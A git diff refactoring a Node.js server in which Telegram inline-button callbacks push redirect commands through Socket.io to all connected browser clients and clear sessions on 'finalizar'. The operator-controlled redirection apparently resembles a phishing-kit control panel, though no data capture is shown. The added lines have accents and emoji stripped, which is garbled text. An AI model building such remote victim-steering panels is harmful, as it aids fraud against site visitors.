             });
         }
     });
 
-    // Evento: Desconexión
-    socket.on('disconnect', (reason) => {
-        console.log('🔌 Cliente desconectado:', socket.id, '- Razón:', reason);
-        connectedClients.delete(socket.id);
+    // Evento: Ping para mantener conexión activa
+    socket.on('ping', (data) => {
+        socket.emit('pong', { timestamp: Date.now() });
+        console.log(' Ping recibido de:', socket.id);
+    });
+    
+    // Evento: Confirmación de recepción de eventos
+    socket.on('event_received', (data) => {
+        console.log(` Confirmacion recibida - Action: ${data.action}, Socket: ${socket.id}`);
     });
 
-    // Evento: Error en socket
+    // Evento: Desconexin
+    socket.on('disconnect', (reason) => {
+        console.log(' Cliente desconectado:', socket.id, '', reason);
+        applicationState.connectedClients.delete(socket.id);
+    });
+
+    // Evento: Error
     socket.on('error', (error) => {
-        console.error('❌ Error en socket:', socket.id, error.message);
+        console.error(' Error en socket:', socket.id, error.message);
     });
 });
 
-// ===============================
-// TELEGRAM BOT - CALLBACK QUERIES
-// ===============================
+// =========================================
+// TELEGRAM BOT  CALLBACK QUERIES
+// =========================================
 
-bot.on('callback_query', async (callbackQuery) => {
-    if (!callbackQuery || !callbackQuery.message) {
-        console.error('❌ Callback query inválido');
-        return;
-    }
-    
-    try {
+function setupTelegramBot() {
+    applicationState.bot.on('callback_query', async (callbackQuery) => {
+        if (!callbackQuery || !callbackQuery.message) {
+            console.error(' Callback query invlido');
+            return;
+        }
+
         const action = callbackQuery.data;
         const messageId = callbackQuery.message.message_id;
-        const userId = callbackQuery.from.id;
-        
-        console.log(`📲 Callback recibido - Acción: "${action}", Message ID: ${messageId}, User: ${userId}`);
-        
-        // Determinar URL base - Render automáticamente expone RENDER_EXTERNAL_URL
-        const baseUrl = process.env.RENDER_EXTERNAL_URL || 
-                       process.env.BASE_URL || 
-                       (NODE_ENV === 'production' ? '' : `http://localhost:${PORT}`);
-        
-        console.log(`🔗 Using baseUrl: ${baseUrl}`);
 
-        // Responder inmediatamente al callback query
-        await bot.answerCallbackQuery(callbackQuery.id, {
-            text: action === 'finalizar' ? '✅ Proceso finalizado' : '✓ Acción procesada',
-            show_alert: false
-        });
+        console.log(` Callback: ${action}`);
 
-        // Obtener información de redirección
-        const { message, url } = handleRedirect(action, baseUrl);
+        try {
+            // Responder al callback
+            await applicationState.bot.answerCallbackQuery(callbackQuery.id, {
+                text: action === 'finalizar' ? ' Proceso finalizado' : ` Redirigiendo...`,
+                show_alert: false
+            });
 
-        // Emitir evento a TODOS los clientes conectados
-        console.log(`📡 Emitiendo acción "${action}" a ${connectedClients.size} clientes`);
-        io.emit('telegram_action', {
-            action,
-            messageId,
-            message,
-            redirect: url,
-            timestamp: new Date().toISOString()
-        });
+            // Obtener informacin de redireccin
+            const redirectInfo = RedirectHandler.getRedirectInfo(action);
 
-        // Si es finalizar, editar el mensaje original
-        if (action === 'finalizar') {
-            try {
-                // Limpiar todas las sesiones activas
-                console.log('🧹 Limpiando todas las sesiones activas...');
-                const sessionCount = sessionData.size;
-                sessionData.clear();
-                console.log(`✅ ${sessionCount} sesión(es) limpiada(s)`);
-                
-                const finalMessage = `✅ <b>Proceso finalizado</b>\n\n${callbackQuery.message.text}\n\n🧹 <i>Todas las sesiones han sido limpiadas</i>`;
-                await bot.editMessageText(finalMessage, {
-                    chat_id: TELEGRAM_CHAT_ID,
+            // Preparar datos del evento
+            const eventData = {
+                action,
+                messageId,
+                message: redirectInfo.message,
+                redirect: redirectInfo.url,
+                timestamp: new Date().toISOString()
+            };
+
+            // Emitir evento a TODOS los clientes (solo una vez)
+            io.emit('telegram_action', eventData);
+            
+            const clientsConnected = applicationState.connectedClients.size;
+            console.log(` [EMIT] ${clientsConnected} cliente(s) | ${action}`);
+            
+            // Verificar que hay clientes conectados
+            if (clientsConnected === 0) {
+                console.warn(` [WARN] Sin clientes`);
+                return;
+            }
+
+            // Esperar mínimo para que el cliente redirija primero (500ms)
+            setTimeout(async () => {
+                if (action !== 'finalizar') {
+                    try {
+                        const originalMessage = callbackQuery.message;
+                        
+                        // Si el mensaje tiene una foto, editar caption; si no, editar texto
+                        if (originalMessage.photo && originalMessage.photo.length > 0) {
+                            await applicationState.bot.editMessageCaption(
+                                `${originalMessage.caption || ''}\n\n✅ <b>COMANDO EJECUTADO</b>`,
+                                {
+                                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
+                                    message_id: messageId,
+                                    parse_mode: 'HTML',
+                                    reply_markup: { inline_keyboard: [] }
+                                }
+                            );
+                        } else {
+                            await applicationState.bot.editMessageText(
+                                `${originalMessage.text || ''}\n\n✅ <b>COMANDO EJECUTADO</b>`,
+                                {
+                                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
+                                    message_id: messageId,
+                                    parse_mode: 'HTML',
+                                    reply_markup: { inline_keyboard: [] }
+                                }
+                            );
+                        }
+                        console.log(` [OK] Mensaje actualizado`);
+                    } catch (err) {
+                        // Ignorar errores
+                    }
+                }
+            }, 500);
+
+            // Si es finalizar, limpiar sesiones y editar mensaje
+            if (action === 'finalizar') {
+                const sessionCount = applicationState.sessions.size;
+                applicationState.sessions.clear();
+                console.log(` ${sessionCount} sesin(es) limpiada(s)`);
+
+                const finalMessage = ` <b>Proceso finalizado</b>\n\n${callbackQuery.message.text}\n\n <i>Sesiones limpiadas</i>`;
+
+                await applicationState.bot.editMessageText(finalMessage, {
+                    chat_id: CONFIG.TELEGRAM.CHAT_ID,
                     message_id: messageId,
                     parse_mode: 'HTML',
                     reply_markup: { inline_keyboard: [] }
                 });
-                console.log('✅ Mensaje de Telegram actualizado');
-            } catch (error) {
-                console.error('❌ Error al editar mensaje:', error.message);
+
+                console.log(' Mensaje actualizado');
+            }
+
+            console.log(` Callback "${action}" COMPLETADO`);
+            console.log(`========================================\n`);
+
+        } catch (error) {
+            console.error(' Error en callback:', error.message);
+
+            try {
+                await applicationState.bot.answerCallbackQuery(callbackQuery.id, {
+                    text: ' Error al procesar la accin',
+                    show_alert: true
+                });
+            } catch (e) {
+                console.error(' No se pudo notificar el error');
             }
         }
-        
-        console.log(`✅ Callback procesado correctamente para acción "${action}"`);
-    } catch (error) {
-        console.error('❌ Error al procesar callback query:', error.message);
-        
-        // Intentar notificar al usuario del error
-        try {
-            await bot.answerCallbackQuery(callbackQuery.id, {
-                text: '❌ Error al procesar la acción',
-                show_alert: true
-            });
-        } catch (e) {
-            console.error('❌ No se pudo notificar el error al usuario');
+    });
+
+    // Eventos de error del bot
+    applicationState.bot.on('error', (error) => {
+        console.error(' Error del bot:', error.message);
+    });
+
+    applicationState.bot.on('polling_error', (error) => {
+        // Ignorar errores 409 (mltiples instancias)
+        if (error.code === 'ETELEGRAM' && error.message.includes('409')) {
+            console.warn(' Detectada otra instancia del bot. Ignorando polling...');
+            return;
         }
-    }
-});
+        console.error(' Error de polling:', error.message);
+    });
 
-// ===============================
+    applicationState.bot.on('webhook_error', (error) => {
+        console.error(' Error de webhook:', error.message);
+    });
+}
+
+// =========================================
 // MANEJO DE ERRORES GLOBAL
-// ===============================
+// =========================================
 
-// Errores del bot de Telegram
-bot.on('error', (error) => {
-    console.error('❌ Error del bot de Telegram:', error.message);
-});
-
-bot.on('polling_error', (error) => {
-    console.error('❌ Error de polling:', error.message);
-});
-
-bot.on('webhook_error', (error) => {
-    console.error('❌ Error de webhook:', error.message);
-});
-
-// Errores no capturados
 process.on('unhandledRejection', (reason, promise) => {
-    console.error('❌ Unhandled Rejection:', reason);
-    console.error('Promise:', promise);
+    console.error(' Unhandled Rejection:', reason);
 });
 
 process.on('uncaughtException', (error) => {
-    console.error('❌ Uncaught Exception:', error);
-    // No cerrar el proceso en producción
-    if (NODE_ENV !== 'production') {
+    console.error(' Uncaught Exception:', error);
+    if (CONFIG.NODE_ENV !== 'production') {
         process.exit(1);
     }
 });
 
-// Manejo de cierre graceful
-process.on('SIGTERM', () => {
-    console.log('🛑 SIGTERM recibido, cerrando servidor...');
+// Cierre graceful
+process.on('SIGTERM', gracefulShutdown);
+process.on('SIGINT', gracefulShutdown);
+
+function gracefulShutdown() {
+    if (applicationState.isShuttingDown) return;
+
+    applicationState.isShuttingDown = true;
+    console.log(' Cerrando servidor...');
+
     httpServer.close(() => {
-        console.log('✅ Servidor cerrado correctamente');
-        bot.stopPolling();
+        console.log(' Servidor cerrado');
+        if (applicationState.bot) {
+            applicationState.bot.stopPolling();
+        }
         process.exit(0);
     });
-});
 
-process.on('SIGINT', () => {
-    console.log('🛑 SIGINT recibido, cerrando servidor...');
-    httpServer.close(() => {
-        console.log('✅ Servidor cerrado correctamente');
-        bot.stopPolling();
-        process.exit(0);
-    });
-});
+    // Forzar cierre despus de 10 segundos
+    setTimeout(() => {
+        console.error(' Cierre forzado');
+        process.exit(1);
+    }, 10000);
+}
 
-// ===============================
-// INICIALIZACIÓN DEL SERVIDOR
-// ===============================
+// =========================================
+// INICIALIZACIN DEL SERVIDOR
+// =========================================
 
 async function startServer() {
     try {
-        // Verificar conexión con Telegram
-        const botInfo = await bot.getMe();
-        console.log('✅ Bot de Telegram conectado:', botInfo.username);
-        console.log('📱 Bot ID:', botInfo.id);
-        
-        // Desactivar webhook para polling local
-        await bot.deleteWebHook();
-        console.log('✅ Webhook desactivado (modo polling)');
-        
-        // Iniciar servidor HTTP
-        httpServer.listen(PORT, () => {
-            console.log('🚀 ===============================');
-            console.log(`🚀 Servidor iniciado exitosamente`);
-            console.log(`🚀 Puerto: ${PORT}`);
-            console.log(`🚀 Entorno: ${NODE_ENV}`);
-            console.log(`🚀 URL: http://localhost:${PORT}`);
-            console.log(`🚀 Socket.io: Activo`);
-            console.log(`🚀 Clientes conectados: ${connectedClients.size}`);
-            console.log('🚀 ===============================');
+        // Inicializar bot de Telegram
+        applicationState.bot = new TelegramBot(CONFIG.TELEGRAM.TOKEN, {
+            polling: {
+                interval: 1000,
+                autoStart: true,
+                params: {
+                    timeout: 10
+                }
+            },
+            filepath: false
         });
-        
+
+        // Verificar conexin
+        const botInfo = await applicationState.bot.getMe();
+        console.log(' Bot conectado:', botInfo.username);
+        console.log(' Bot ID:', botInfo.id);
+
+        // Desactivar webhook
+        await applicationState.bot.deleteWebHook();
+        console.log(' Webhook desactivado (modo polling)');
+
+        // Configurar callbacks del bot
+        setupTelegramBot();
+
+        // Iniciar servidor HTTP
+        httpServer.listen(CONFIG.PORT, () => {
+            console.log('\n ===============================');
+            console.log(' SERVIDOR INICIADO EXITOSAMENTE');
+            console.log(` Puerto: ${CONFIG.PORT}`);
+            console.log(` Entorno: ${CONFIG.NODE_ENV}`);
+            console.log(` URL: http://localhost:${CONFIG.PORT}`);
+            console.log(' Socket.io: Activo');
+            console.log(` Clientes: ${applicationState.connectedClients.size}`);
+            console.log(` Sesiones: ${applicationState.sessions.size}`);
+            console.log(' ===============================\n');
+        });
+
     } catch (error) {
-        console.error('❌ Error crítico al iniciar el servidor:', error.message);
+        console.error(' Error crtico al iniciar:', error.message);
         console.error('Stack:', error.stack);
         process.exit(1);
     }
@@ -685,12 +909,13 @@ async function startServer() {
 
 // Iniciar el servidor
 startServer().catch(error => {
-    console.error('❌ Error fatal:', error);
+    console.error(' Error fatal:', error);
     process.exit(1);
 });
 
-// ===============================
+// =========================================
 // EXPORTAR PARA OTROS ENTORNOS
-// ===============================
+// =========================================
 
-module.exports = { app, httpServer, io, bot };
+module.exports = { app, httpServer, io };
+
